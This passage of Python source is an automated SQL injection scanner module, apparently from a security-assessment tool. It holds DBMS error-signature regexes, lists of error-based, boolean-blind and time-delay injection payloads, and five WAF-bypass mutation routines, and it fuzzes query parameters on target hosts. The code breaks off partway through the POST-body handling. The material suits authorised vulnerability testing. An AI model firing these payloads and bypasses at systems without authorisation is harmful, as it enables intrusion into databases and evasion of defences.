"""
SQL Injection Detection Engine and Collector.

Actively fuzzes discovered endpoint parameters (query params, POST form & JSON bodies,
path segments, and HTTP headers) for error-based, boolean-based blind, and time-based blind
SQL injection vulnerabilities using AuthenticatedHttpClient.

Supports multi-DBMS error signature matching (MySQL, PostgreSQL, MSSQL, Oracle, SQLite),
differential boolean analysis, latency delay calibration, and 5 WAF bypass mutation strategies.
Emits high-confidence Evidence(category="sql_injection"), updates mission vulnerabilities,
and expands attack surface graph nodes with HAS_ENDPOINT and HAS_VULNERABILITY edges.
"""
from __future__ import annotations

import json
import logging
import re
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Set, Tuple

from argus.collectors.base import BaseCollector
from argus.evidence.model import Evidence, ProvenanceData
from argus.graph.node import Node
from argus.http.client import AuthenticatedHttpClient, HttpResponse

logger = logging.getLogger(__name__)

# DBMS Error Regex Signatures Catalog
DBMS_ERROR_SIGNATURES: Dict[str, List[Tuple[str, re.Pattern]]] = {
    "mysql": [
        ("mysql_syntax_error", re.compile(r"You have an error in your SQL syntax", re.IGNORECASE)),
        ("mysql_version_manual", re.compile(r"check the manual that corresponds to your (?:MySQL|MariaDB) server version", re.IGNORECASE)),
        ("mysql_client_error", re.compile(r"\bMySqlClient\.", re.IGNORECASE)),
        ("mysql_jdbc_error", re.compile(r"com\.mysql\.jdbc\.exceptions", re.IGNORECASE)),
        ("mysql_syntax_exception", re.compile(r"\bMySQLSyntaxErrorException\b", re.IGNORECASE)),
        ("mysql_valid_result", re.compile(r"valid MySQL result", re.IGNORECASE)),
        ("mysql_unknown_column", re.compile(r"Unknown column '[^']+' in '(?:where clause|field list|order clause)'", re.IGNORECASE)),
        ("mysql_table_not_found", re.compile(r"Table '[^']+' doesn't exist", re.IGNORECASE)),
    ],
    "postgresql": [
        ("postgres_error", re.compile(r"PostgreSQL.*ERROR", re.IGNORECASE)),
        ("postgres_query_failed", re.compile(r"pg_query\(\): Query failed:", re.IGNORECASE)),
        ("postgres_exec_failed", re.compile(r"pg_exec\(\): Query failed:", re.IGNORECASE)),
        ("postgres_psql_exception", re.compile(r"org\.postgresql\.util\.PSQLException", re.IGNORECASE)),
        ("postgres_psql_exception_short", re.compile(r"\bPSQLException\b", re.IGNORECASE)),
        ("postgres_syntax_near", re.compile(r"ERROR:\s+syntax error at or near", re.IGNORECASE)),
        ("postgres_column_missing", re.compile(r"ERROR:\s+column \"[^\"]+\" does not exist", re.IGNORECASE)),
        ("postgres_relation_missing", re.compile(r"ERROR:\s+relation \"[^\"]+\" does not exist", re.IGNORECASE)),
        ("postgres_aborted_transaction", re.compile(r"current transaction is aborted, commands ignored until end of transaction block", re.IGNORECASE)),
    ],
    "mssql": [
        ("mssql_driver_error", re.compile(r"Driver.*SQL[-_ ]Server", re.IGNORECASE)),
        ("mssql_oledb_error", re.compile(r"OLE DB.*SQL Server", re.IGNORECASE)),
        ("mssql_jdbc_driver", re.compile(r"\bSQLServer JDBC Driver\b", re.IGNORECASE)),
        ("mssql_unclosed_quote", re.compile(r"Unclosed quotation mark (?:after|before) the character string", re.IGNORECASE)),
        ("mssql_odbc_driver", re.compile(r"\[Microsoft\]\[ODBC SQL Server Driver\]", re.IGNORECASE)),
        ("mssql_server_tag", re.compile(r"\[SQL Server\]", re.IGNORECASE)),
        ("mssql_syntax_near", re.compile(r"Incorrect syntax near", re.IGNORECASE)),
        ("mssql_conversion_failed", re.compile(r"Conversion failed when converting the varchar value", re.IGNORECASE)),
    ],
    "oracle": [
        ("oracle_ora_code", re.compile(r"\bORA-[0-9]{5}\b")),
        ("oracle_error_tag", re.compile(r"Oracle error", re.IGNORECASE)),
        ("oracle_driver_error", re.compile(r"Oracle.*Driver", re.IGNORECASE)),
        ("oracle_quoted_string", re.compile(r"quoted string not properly terminated", re.IGNORECASE)),
        ("oracle_command_not_ended", re.compile(r"SQL command not properly ended", re.IGNORECASE)),
    ],
    "sqlite": [
        ("sqlite_jdbc_driver", re.compile(r"SQLite/JDBCDriver", re.IGNORECASE)),
        ("sqlite_exception", re.compile(r"SQLite\.Exception", re.IGNORECASE)),
        ("sqlite_operational_error", re.compile(r"sqlite3\.OperationalError", re.IGNORECASE)),
        ("sqlite_error_tag", re.compile(r"\bSQLITE_ERROR\b")),
        ("sqlite_syntax_near", re.compile(r"near \"[^\"]*\": syntax error", re.IGNORECASE)),
        ("sqlite_unrecognized_token", re.compile(r"unrecognized token:", re.IGNORECASE)),
    ],
}

# Base Payloads
DEFAULT_ERROR_PAYLOADS: List[str] = [
    "'",
    "\"",
    "\\'",
    "\\\"",
    "')",
    "\")",
    "1'",
    "1\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "1' AND 1=CONVERT(int, (SELECT @@version))--",
    "1' AND (SELECT 1 FROM (SELECT(SLEEP(0)))a)--",
    "1' AND 1=CAST((SELECT version()) AS INT)--",
    "1' AND ctxsys.drithsx.sn(1, (SELECT banner FROM v$version WHERE rownum=1))--",
    "1' AND 1=CAST((SELECT sqlite_version()) AS INT)--",
    "1 ORDER BY 1--",
    "1 ORDER BY 9999--",
]

DEFAULT_BOOLEAN_PAIRS: List[Tuple[str, str]] = [
    ("' OR 1=1--", "' OR 1=2--"),
    ("' OR '1'='1", "' OR '1'='2"),
    ("' OR 'a'='a", "' OR 'a'='b"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1 AND 1=1--", "1 AND 1=2--"),
    ("') OR ('1'='1", "') OR ('1'='2"),
    ("\" OR 1=1--", "\" OR 1=2--"),
    ("\" OR \"1\"=\"1", "\" OR \"1\"=\"2"),
    ("' OR 1=1#", "' OR 1=2#"),
    ("' OR 1=1/*", "' OR 1=2/*"),
]

DEFAULT_TIME_PAYLOADS_TEMPLATE: List[str] = [
    "' OR SLEEP({delay})--",
    "1' OR SLEEP({delay})--",
    "'; SELECT SLEEP({delay});--",
    "1' AND (SELECT 1 FROM (SELECT(SLEEP({delay})))a)--",
    "'; SELECT pg_sleep({delay});--",
    "1' AND (SELECT 1 FROM (SELECT(pg_sleep({delay})))a)--",
    "' OR pg_sleep({delay})--",
    "'; WAITFOR DELAY '0:0:{delay}'--",
    "1'; WAITFOR DELAY '0:0:{delay}'--",
    "' WAITFOR DELAY '0:0:{delay}'--",
    "1' AND 1=dbms_pipe.receive_message('RDS', {delay})--",
    "1' AND 1=dbms_lock.sleep({delay})--",
]

COMMON_SQL_PARAMS: Set[str] = {
    "id", "user", "username", "password", "email", "search", "q", "query",
    "cat", "category", "item", "page", "sort", "filter", "name", "view",
    "order", "dir", "limit", "offset", "key", "token", "code", "file",
    "product", "role", "group", "type", "lang", "ref", "target", "account",
}

DEFAULT_SQLI_PROBE_ROUTES: List[str] = [
    "/search",
    "/api/search",
    "/login",
    "/api/login",
    "/api/v1/users",
    "/api/users",
    "/item",
    "/products",
    "/items",
    "/user",
]


class SQLInjectionPayloadGenerator:
    """
    Generates base payloads and applies 5 WAF bypass mutation strategies
    for error-based, boolean-based, and time-based SQL injection fuzzing.
    """

    SQL_KEYWORDS_PATTERN = re.compile(
        r"\b(SELECT|UNION|WHERE|AND|OR|SLEEP|WAITFOR|DELAY|CONVERT|CAST|FROM|ORDER|BY|HAVING|GROUP|LIMIT|EXEC|EXECUTE|DBMS_PIPE|RECEIVE_MESSAGE|DBMS_LOCK|PG_SLEEP|NULL|VERSION|BANNER|ROWNUM|COUNT|VARCHAR)\b",
        re.IGNORECASE,
    )

    def __init__(
        self,
        custom_error_payloads: Optional[List[str]] = None,
        custom_boolean_pairs: Optional[List[Tuple[str, str]]] = None,
        custom_time_payloads: Optional[List[str]] = None,
    ):
        self.custom_error_payloads = list(custom_error_payloads) if custom_error_payloads is not None else None
        self.custom_boolean_pairs = list(custom_boolean_pairs) if custom_boolean_pairs is not None else None
        self.custom_time_payloads = list(custom_time_payloads) if custom_time_payloads is not None else None

    def generate_error_payloads(self) -> List[str]:
        """Returns base error-based payloads."""
        if self.custom_error_payloads is not None:
            return list(self.custom_error_payloads)
        return list(DEFAULT_ERROR_PAYLOADS)

    def generate_boolean_payload_pairs(self) -> List[Tuple[str, str]]:
        """Returns base boolean TRUE/FALSE payload pairs."""
        if self.custom_boolean_pairs is not None:
            return list(self.custom_boolean_pairs)
        return list(DEFAULT_BOOLEAN_PAIRS)

    def generate_time_payloads(self, delay: int = 5) -> List[str]:
        """Returns base time-delay payloads configured with the given delay in seconds."""
        if self.custom_time_payloads is not None:
            return list(self.custom_time_payloads)
        return [p.format(delay=delay) for p in DEFAULT_TIME_PAYLOADS_TEMPLATE]

    # --- 5 Distinct WAF Bypass Mutation Strategies ---

    def mutate_case_alternation(self, payload: str) -> str:
        """
        Strategy 1: Case Alternation.
        Transforms SQL keyword characters into alternating case (e.g. sElEcT, uNiOn, sLeEp).
        """
        def _alternate(match: re.Match) -> str:
            word = match.group(0)
            chars = []
            for i, c in enumerate(word):
                chars.append(c.lower() if i % 2 == 0 else c.upper())
            return "".join(chars)

        return self.SQL_KEYWORDS_PATTERN.sub(_alternate, payload)

    def mutate_comment_insertion(self, payload: str) -> str:
        """
        Strategy 2: Comment Insertion.
        Inserts inline SQL comments /**/ inside or between keywords (e.g. SEL/**/ECT, UN/**/ION).
        """
        def _comment_inside(match: re.Match) -> str:
            word = match.group(0)
            if len(word) > 2:
                mid = len(word) // 2
                return f"{word[:mid]}/**/{word[mid:]}"
            return word

        return self.SQL_KEYWORDS_PATTERN.sub(_comment_inside, payload)

    def mutate_url_encoding(self, payload: str) -> str:
        """
        Strategy 3: URL Percent Encoding.
        Encodes special characters (', ", space, =, -, #, ;, (, ), ,) into percent format.
        """
        # Encode all non-alphanumeric characters except safe ones
        return urllib.parse.quote(payload, safe="")

    def mutate_double_url_encoding(self, payload: str) -> str:
        """
        Strategy 4: Double URL Percent Encoding.
        Double encodes special characters (e.g. %27 -> %2527) to bypass multi-tier WAF / reverse proxies.
        """
        first_pass = urllib.parse.quote(payload, safe="")
        return urllib.parse.quote(first_pass, safe="")

    def mutate_whitespace_substitution(self, payload: str) -> str:
        """
        Strategy 5: Whitespace Substitution.
        Replaces standard spaces with SQL-compatible alternatives (e.g. tab %09 or inline comments /**/).
        """
        if " " in payload:
            return payload.replace(" ", "%09")
        return payload

    def mutate_waf_bypass(self, payload: str) -> List[str]:
        """
        Applies all 5 WAF bypass mutation strategies to generate a unique list of variants.
        """
        variants: List[str] = [
            self.mutate_case_alternation(payload),
            self.mutate_comment_insertion(payload),
            self.mutate_url_encoding(payload),
            self.mutate_double_url_encoding(payload),
            self.mutate_whitespace_substitution(payload),
            payload.replace(" ", "/**/"),
            payload.replace(" ", "%0a"),
            payload.replace(" ", "+"),
        ]
        # Preserve order and deduplicate
        seen = set()
        unique_variants = []
        for v in variants:
            if v and v != payload and v not in seen:
                seen.add(v)
                unique_variants.append(v)
        return unique_variants


class SQLInjectionAnalyzer:
    """
    Evaluates HTTP responses for genuine SQL injection vulnerabilities across:
    1. Error-Based Detection (MySQL, PostgreSQL, MSSQL, Oracle, SQLite).
    2. Boolean-Based Blind Differential Analysis (TRUE vs FALSE length/content).
    3. Time-Based Blind Delay Measurement (delta >= 4.0s vs baseline).
    4. False Positive & Reflection Suppression.
    """

    GENERIC_ERROR_TITLES = re.compile(
        r"<title>[^<]*(?:error|exception|not found|bad request|forbidden|server error)[^<]*</title>",
        re.IGNORECASE,
    )

    def is_false_positive(self, response: HttpResponse, payload: str) -> bool:
        """
        Determines if a response is a false positive (e.g. generic application error
        or plain reflection of payload text without database error execution).
        """
        if not response or not response.raw_body:
            return True

        body_str = str(response.raw_body)
        clean_payload = str(payload).strip()

        # If the body is very small or empty
        if len(body_str.strip()) < 5:
            return True

        # If payload is reflected in an HTML title or search query echo, check if there is an actual DBMS error
        has_dbms_sig = False
        for dbms, sigs in DBMS_ERROR_SIGNATURES.items():
            for _, pattern in sigs:
                if pattern.search(body_str):
                    has_dbms_sig = True
                    break
            if has_dbms_sig:
                break

        # If no DBMS signature matched, and it's just generic error words or query reflection
        if not has_dbms_sig:
            if clean_payload and clean_payload in body_str:
                return True
            # Check for generic error words without DB context
            if any(w in body_str.lower() for w in ["error", "syntax", "sql", "database"]):
                # Generic application error without DBMS syntax signature is a false positive
                return True

        # Reflection discard: if matched text is only found inside the literal echoed payload
        if clean_payload and clean_payload in body_str:
            # Check if any DBMS error occurs OUTSIDE the reflected payload span
            payload_occurrences = [m.start() for m in re.finditer(re.escape(clean_payload), body_str)]
            error_outside_reflection = False
            for dbms, sigs in DBMS_ERROR_SIGNATURES.items():
                for _, pattern in sigs:
                    for match in pattern.finditer(body_str):
                        m_start = match.start()
                        m_end = match.end()
                        inside_reflection = any(p_start <= m_start and m_end <= (p_start + len(clean_payload)) for p_start in payload_occurrences)
                        if not inside_reflection:
                            error_outside_reflection = True
                            break
                    if error_outside_reflection:
                        break
                if error_outside_reflection:
                    break

            if not error_outside_reflection and has_dbms_sig:
                # The signature occurred only inside the reflected user input
                return True

        return False

    def analyze_error_based(
        self,
        response: HttpResponse,
        baseline: Optional[HttpResponse] = None,
        payload: str = "",
    ) -> Optional[Dict[str, Any]]:
        """
        Evaluates response body for DBMS-specific syntax error signatures.
        Returns match metadata dictionary if genuine error-based SQLi is confirmed, else None.
        """
        if not response:
            return None

        body_str = getattr(response, "raw_body", None) or getattr(response, "body", "") or ""
        if not body_str or len(body_str.strip()) < 5:
            return None

        baseline_body = ""
        if baseline:
            baseline_body = getattr(baseline, "raw_body", None) or getattr(baseline, "body", "") or ""

        # Check all DBMS signature catalogs
        for dbms, sigs in DBMS_ERROR_SIGNATURES.items():
            for sig_name, pattern in sigs:
                match = pattern.search(body_str)
                if not match:
                    continue

                # Baseline differential check: if the baseline already contained this exact DBMS error, ignore
                if baseline_body and pattern.search(baseline_body):
                    continue

                matched_text = match.group(0)

                # Reflection Guard: if matched text is just an echo of the injected payload string
                clean_payload = payload.strip()
                if clean_payload and clean_payload in body_str:
                    if matched_text in clean_payload and len(matched_text) < len(clean_payload):
                        # Verify whether error occurs outside the payload string reflection
                        if self.is_false_positive(response, payload):
                            continue

                # Extract context snippet around match
                start_pos = max(0, match.start() - 30)
                end_pos = min(len(body_str), match.end() + 100)
                snippet = body_str[start_pos:end_pos].strip()

                template_id = f"sqli-error-{dbms}"

                return {
                    "technique": "error_based",
                    "dbms": dbms,
                    "matched_signature": sig_name,
                    "matched_text": matched_text,
                    "snippet": snippet,
                    "template_id": template_id,
                    "severity": "critical",
                    "confidence": 0.95,
                }

        return None

    def analyze_boolean_blind(
        self,
        true_resp: HttpResponse,
        false_resp: HttpResponse,
        baseline: Optional[HttpResponse] = None,
        true_payload: str = "",
        false_payload: str = "",
    ) -> Optional[Dict[str, Any]]:
        """
        Performs differential analysis between TRUE and FALSE payload responses.
        Returns match metadata if differential behavior indicates SQL injection.
        """
        if not true_resp or not false_resp:
            return None

        true_status = getattr(true_resp, "status_code", None)
        false_status = getattr(false_resp, "status_code", None)

        true_body = getattr(true_resp, "raw_body", None) or getattr(true_resp, "body", "") or ""
        false_body = getattr(false_resp, "raw_body", None) or getattr(false_resp, "body", "") or ""

        len_true = len(true_body)
        len_false = len(false_body)
        len_delta = abs(len_true - len_false)

        baseline_status = getattr(baseline, "status_code", None) if baseline else None
        baseline_body = (getattr(baseline, "raw_body", None) or getattr(baseline, "body", "") or "") if baseline else ""
        len_baseline = len(baseline_body)

        # 1. Status Code Differential:
        # TRUE returns 200 OK (or baseline status), FALSE returns 404, 500, 400, 403, 302
        if true_status is not None and false_status is not None:
            if true_status != false_status:
                # Confirm TRUE aligns with normal behavior (2xx or baseline) while FALSE deviates
                if (true_status == 200 or (baseline_status and true_status == baseline_status)) and false_status in (404, 500, 400, 403, 302, 422):
                    return {
                        "technique": "boolean_blind",
                        "subtype": "status_code_differential",
                        "true_status": true_status,
                        "false_status": false_status,
                        "true_length": len_true,
                        "false_length": len_false,
                        "length_delta": len_delta,
                        "template_id": "sqli-boolean-blind",
                        "severity": "high",
                        "confidence": 0.90,
                        "snippet": f"Status differential: TRUE={true_status} vs FALSE={false_status}",
                    }

        # 2. Content Length Differential Analysis:
        # Require meaningful byte delta (> 25 bytes or > 10% delta) and stability with baseline if available
        min_delta_threshold = 25

        if len_delta >= min_delta_threshold:
            # Check noise tolerance: if baseline is present, TRUE should resemble baseline more than FALSE
            if baseline and len_baseline > 0:
                delta_true_base = abs(len_true - len_baseline)
                delta_false_base = abs(len_false - len_baseline)

                # If TRUE response is close to baseline and FALSE diverges significantly
                if delta_false_base >= min_delta_threshold and delta_true_base < delta_false_base:
                    return {
                        "technique": "boolean_blind",
                        "subtype": "length_differential",
                        "true_status": true_status or 200,
                        "false_status": false_status or 200,
                        "true_length": len_true,
                        "false_length": len_false,
                        "length_delta": len_delta,
                        "template_id": "sqli-boolean-blind",
                        "severity": "high",
                        "confidence": 0.90,
                        "snippet": f"Differential length: TRUE={len_true} bytes, FALSE={len_false} bytes (delta={len_delta})",
                    }
            else:
                # Without baseline, significant difference between TRUE and FALSE with 2xx status codes
                if true_status == 200 and false_status == 200:
                    return {
                        "technique": "boolean_blind",
                        "subtype": "length_differential",
                        "true_status": true_status,
                        "false_status": false_status,
                        "true_length": len_true,
                        "false_length": len_false,
                        "length_delta": len_delta,
                        "template_id": "sqli-boolean-blind",
                        "severity": "high",
                        "confidence": 0.85,
                        "snippet": f"Differential length: TRUE={len_true} bytes, FALSE={len_false} bytes (delta={len_delta})",
                    }

        return None

    def analyze_time_blind(
        self,
        injected_resp: HttpResponse,
        baseline_elapsed: float,
        threshold: float = 4.0,
    ) -> Optional[Dict[str, Any]]:
        """
        Evaluates request latency against baseline request timing.
        Returns match metadata if injected latency exceeds baseline by threshold (default >= 4.0s).
        """
        if not injected_resp:
            return None

        injected_elapsed = getattr(injected_resp, "elapsed", 0.0) or 0.0
        base_elapsed = max(0.0, float(baseline_elapsed or 0.0))
        delay_delta = injected_elapsed - base_elapsed

        # Confirm that injected request took at least threshold seconds longer than baseline,
        # and total injected elapsed time is at least threshold seconds
        if delay_delta >= threshold and injected_elapsed >= threshold:
            return {
                "technique": "time_blind",
                "injected_elapsed": round(injected_elapsed, 3),
                "baseline_elapsed": round(base_elapsed, 3),
                "delay_delta": round(delay_delta, 3),
                "template_id": "sqli-time-blind",
                "severity": "critical",
                "confidence": 0.95,
                "snippet": f"Time delay confirmed: elapsed={injected_elapsed:.2f}s, baseline={base_elapsed:.2f}s (delta={delay_delta:.2f}s >= {threshold}s)",
            }

        return None


class SQLInjectionCollector(BaseCollector):
    """
    Autonomous SQL Injection Collector for ARGUS.
    Fuzzes endpoint parameters across query strings, POST JSON & form bodies,
    path segments, and HTTP headers using AuthenticatedHttpClient.
    """

    def __init__(
        self,
        http_client: Optional[Any] = None,
        payload_generator: Optional[SQLInjectionPayloadGenerator] = None,
        analyzer: Optional[SQLInjectionAnalyzer] = None,
        timeout: float = 10.0,
    ):
        self.http_client = http_client
        self.generator = payload_generator or SQLInjectionPayloadGenerator()
        self.analyzer = analyzer or SQLInjectionAnalyzer()
        self.timeout = timeout

    def _normalize_base_url(self, raw_url: str) -> str:
        raw_clean = str(raw_url).strip()
        if not raw_clean.startswith("http://") and not raw_clean.startswith("https://"):
            raw_clean = f"https://{raw_clean}"
        parsed = urllib.parse.urlparse(raw_clean)
        scheme = parsed.scheme or "https"
        netloc = parsed.netloc or parsed.path.split("/")[0]
        return f"{scheme}://{netloc}"

    def _extract_candidate_endpoints(self, mission: Any) -> List[Dict[str, Any]]:
        """
        Extracts structured candidate endpoints, methods, and parameter targets from mission state.
        """
        raw_mission = getattr(mission, "_mission", mission)
        candidates: List[Dict[str, Any]] = []
        seen_urls: Set[str] = set()

        base_hosts: List[str] = []
        for h in getattr(raw_mission, "live_hosts", []) or []:
            if isinstance(h, dict):
                url = h.get("url") or h.get("host")
                if url:
                    base_hosts.append(self._normalize_base_url(url))
            elif isinstance(h, str) and h:
                base_hosts.append(self._normalize_base_url(h))

        target_str = getattr(raw_mission, "target", None)
        if target_str:
            base_hosts.append(self._normalize_base_url(str(target_str)))

        base_hosts = list(dict.fromkeys(base_hosts))
        default_base = base_hosts[0] if base_hosts else "https://target.local"

        # 1. Ingest explicit mission endpoints
        for ep in getattr(raw_mission, "endpoints", []) or []:
            raw_url = ""
            method = "GET"
            params_dict: Dict[str, Any] = {}
            body_data: Any = None
            headers_dict: Dict[str, str] = {}

            if isinstance(ep, dict):
                raw_url = ep.get("url") or ep.get("path") or ""
                method = (ep.get("method") or "GET").upper()
                params_dict = ep.get("params") or {}
                body_data = ep.get("body")
                headers_dict = ep.get("headers") or {}
            elif isinstance(ep, str):
                raw_url = ep

            if not raw_url:
                continue

            if not raw_url.startswith("http://") and not raw_url.startswith("https://"):
                full_url = urllib.parse.urljoin(default_base.rstrip("/") + "/", raw_url.lstrip("/"))
            else:
                full_url = raw_url

            parsed = urllib.parse.urlparse(full_url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"

            # Merge query params from URL if not explicitly given
            if not params_dict and parsed.query:
                parsed_qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                params_dict = {k: v[0] if isinstance(v, list) and len(v) == 1 else v for k, v in parsed_qs.items()}

            if full_url not in seen_urls:
                seen_urls.add(full_url)
                candidates.append({
                    "url": full_url,
                    "base_url": base_url,
                    "path": parsed.path or "/",
                    "method": method,
                    "params": params_dict,
                    "body": body_data,
                    "headers": headers_dict,
                    "source": "mission.endpoints",
                })

        # 2. Add fallback standard probe routes on candidate base hosts
        for base_url in (base_hosts or [default_base]):
            for probe_path in DEFAULT_SQLI_PROBE_ROUTES:
                for param in ("id", "user", "q", "query", "category", "search"):
                    probe_url = f"{base_url.rstrip('/')}{probe_path}?{param}=1"
                    if probe_url not in seen_urls:
                        seen_urls.add(probe_url)
                        parsed = urllib.parse.urlparse(probe_url)
                        candidates.append({
                            "url": probe_url,
                            "base_url": base_url,
                            "path": parsed.path,
                            "method": "GET",
                            "params": {param: "1"},
                            "body": None,
                            "headers": {},
                            "source": "default_probe",
                        })

        return candidates

    def _execute_request(
        self,
        mission: Any,
        method: str,
        url: str,
        params: Optional[Dict[str, Any]] = None,
        data: Optional[Dict[str, Any]] = None,
        json_data: Optional[Any] = None,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
    ) -> Optional[HttpResponse]:
        """
        Dispatches HTTP request using injected or standard AuthenticatedHttpClient.
        """
        method = method.upper()
        try:
            if self.http_client is not None:
                # Check for method-specific callables
                if method == "GET" and hasattr(self.http_client, "get"):
                    try:
                        return self.http_client.get(
                            mission, url, params=params, headers=headers, cookies=cookies, timeout=self.timeout
                        )
                    except TypeError:
                        try:
                            return self.http_client.get(mission, url, timeout=self.timeout)
                        except TypeError:
                            return self.http_client.get(url)
                elif method == "POST" and hasattr(self.http_client, "post"):
                    try:
                        return self.http_client.post(
                            mission, url, data=data, json=json_data, headers=headers, cookies=cookies, timeout=self.timeout
                        )
                    except TypeError:
                        try:
                            return self.http_client.post(mission, url, timeout=self.timeout)
                        except TypeError:
                            return self.http_client.post(url)
                elif hasattr(self.http_client, "request"):
                    try:
                        return self.http_client.request(
                            mission, method, url, params=params, data=data, json=json_data, headers=headers, cookies=cookies, timeout=self.timeout
                        )
                    except TypeError:
                        return self.http_client.request(method, url)
                elif callable(self.http_client):
                    return self.http_client(url)
                return None

            with AuthenticatedHttpClient(timeout=self.timeout, max_retries=1) as client:
                if method == "GET":
                    return client.get(mission, url, params=params, headers=headers, cookies=cookies, timeout=self.timeout)
                elif method == "POST":
                    return client.post(mission, url, data=data, json=json_data, headers=headers, cookies=cookies, timeout=self.timeout)
                else:
                    return client.request(mission, method, url, params=params, data=data, json=json_data, headers=headers, cookies=cookies, timeout=self.timeout)
        except Exception as e:
            logger.debug(f"SQLInjectionCollector request failed for {url}: {e}")
            return None

    def collect(self, mission: Any) -> List[Evidence]:
        """
        Executes active SQL injection fuzzing across discovered endpoints and parameters.
        """
        raw_mission = getattr(mission, "_mission", mission)
        candidates = self._extract_candidate_endpoints(raw_mission)
        if not candidates:
            logger.info("SQLInjectionCollector: No candidate endpoints or hosts to fuzz.")
            return []

        logger.info(f"SQLInjectionCollector: Fuzzing {len(candidates)} candidate endpoint(s)...")

        detected_evidence: List[Evidence] = []
        confirmed_vuln_keys: Set[str] = set()

        error_payloads = self.generator.generate_error_payloads()
        boolean_pairs = self.generator.generate_boolean_payload_pairs()
        time_payloads = self.generator.generate_time_payloads(delay=5)

        for candidate in candidates:
            orig_url = candidate["url"]
            base_url = candidate["base_url"]
            parsed_url = urllib.parse.urlparse(orig_url)
            method = candidate.get("method", "GET")
            raw_params = candidate.get("params") or {}
            body_data = candidate.get("body")
            headers_data = dict(candidate.get("headers") or {})

            # 0. Measure Baseline
            start_base = time.time()
            baseline_resp = self._execute_request(
                mission=raw_mission,
                method=method,
                url=orig_url,
                params=raw_params if method == "GET" else None,
                data=body_data if method == "POST" and isinstance(body_data, dict) else None,
                headers=headers_data,
            )
            baseline_elapsed = getattr(baseline_resp, "elapsed", 0.0) if baseline_resp else (time.time() - start_base)
            baseline_status = getattr(baseline_resp, "status_code", 200) if baseline_resp else 200

            # -------------------------------------------------------------
            # Vector 1: GET Query Parameters
            # -------------------------------------------------------------
            query_params = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True) if parsed_url.query else {}
            if not query_params and raw_params and method == "GET":
                query_params = {k: [v] if not isinstance(v, list) else v for k, v in raw_params.items()}

            if query_params:
                for param_name in list(query_params.keys()):
                    param_vuln_found = False

                    # 1.1 Error-Based Fuzzing
                    for payload in error_payloads:
                        mutated_params = dict(query_params)
                        mutated_params[param_name] = [payload]
                        new_query = urllib.parse.urlencode(mutated_params, doseq=True)
                        target_url = urllib.parse.urlunparse((
                            parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                            parsed_url.params, new_query, parsed_url.fragment,
                        ))

                        resp = self._execute_request(mission, "GET", target_url, headers=headers_data)
                        if not resp:
                            continue

                        analysis = self.analyzer.analyze_error_based(resp, baseline=baseline_resp, payload=payload)
                        if analysis:
                            vuln_key = f"{parsed_url.path}:{param_name}:{analysis['template_id']}"
                            if vuln_key not in confirmed_vuln_keys:
                                confirmed_vuln_keys.add(vuln_key)
                                ev = self._create_evidence_and_update_state(
                                    mission=mission,
                                    target_url=target_url,
                                    base_url=base_url,
                                    param=param_name,
                                    param_type="query",
                                    payload=payload,
                                    status_code=getattr(resp, "status_code", 200) or 200,
                                    analysis=analysis,
                                )
                                detected_evidence.append(ev)
                                param_vuln_found = True
                                break

                    # 1.2 Boolean-Based Blind Differential
                    if not param_vuln_found:
                        for true_payload, false_payload in boolean_pairs:
                            mut_true = dict(query_params)
                            mut_true[param_name] = [true_payload]
                            url_true = urllib.parse.urlunparse((
                                parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                                parsed_url.params, urllib.parse.urlencode(mut_true, doseq=True), parsed_url.fragment,
                            ))

                            mut_false = dict(query_params)
                            mut_false[param_name] = [false_payload]
                            url_false = urllib.parse.urlunparse((
                                parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                                parsed_url.params, urllib.parse.urlencode(mut_false, doseq=True), parsed_url.fragment,
                            ))

                            true_resp = self._execute_request(mission, "GET", url_true, headers=headers_data)
                            false_resp = self._execute_request(mission, "GET", url_false, headers=headers_data)

                            if true_resp and false_resp:
                                analysis = self.analyzer.analyze_boolean_blind(
                                    true_resp=true_resp,
                                    false_resp=false_resp,
                                    baseline=baseline_resp,
                                    true_payload=true_payload,
                                    false_payload=false_payload,
                                )
                                if analysis:
                                    vuln_key = f"{parsed_url.path}:{param_name}:{analysis['template_id']}"
                                    if vuln_key not in confirmed_vuln_keys:
                                        confirmed_vuln_keys.add(vuln_key)
                                        ev = self._create_evidence_and_update_state(
                                            mission=mission,
                                            target_url=url_true,
                                            base_url=base_url,
                                            param=param_name,
                                            param_type="query",
                                            payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                                            status_code=getattr(true_resp, "status_code", 200) or 200,
                                            analysis=analysis,
                                        )
                                        detected_evidence.append(ev)
                                        param_vuln_found = True
                                        break

                    # 1.3 Time-Based Blind
                    if not param_vuln_found:
                        for payload in time_payloads:
                            mut_time = dict(query_params)
                            mut_time[param_name] = [payload]
                            target_url = urllib.parse.urlunparse((
                                parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                                parsed_url.params, urllib.parse.urlencode(mut_time, doseq=True), parsed_url.fragment,
                            ))

                            resp = self._execute_request(mission, "GET", target_url, headers=headers_data)
                            if not resp:
                                continue

                            analysis = self.analyzer.analyze_time_blind(
                                injected_resp=resp,
                                baseline_elapsed=baseline_elapsed,
                                threshold=4.0,
                            )
                            if analysis:
                                vuln_key = f"{parsed_url.path}:{param_name}:{analysis['template_id']}"
                                if vuln_key not in confirmed_vuln_keys:
                                    confirmed_vuln_keys.add(vuln_key)
                                    ev = self._create_evidence_and_update_state(
                                        mission=mission,
                                        target_url=target_url,
                                        base_url=base_url,
                                        param=param_name,
                                        param_type="query",
                                        payload=payload,
                                        status_code=getattr(resp, "status_code", 200) or 200,
                                        analysis=analysis,
                                    )
                                    detected_evidence.append(ev)
                                    param_vuln_found = True
                                    break

            # -------------------------------------------------------------
            # Vector 2: POST Body (JSON & Form-Urlencoded)
            # -------------------------------------------------------------
            post_fields: Dict[str, Any] = {}
            is_json_body = False
            if method == "POST" or body_data is not None:
                if isinstance(body_data, dict):
                    post_fields = dict(body_data)
                    is_json_body = True
                elif isinstance(body_data, str) and body_data.strip().startswith("{"):
                    try:
                        post_fields = json.loads(body_data)
                        is_json_body = True
                    except Exception:
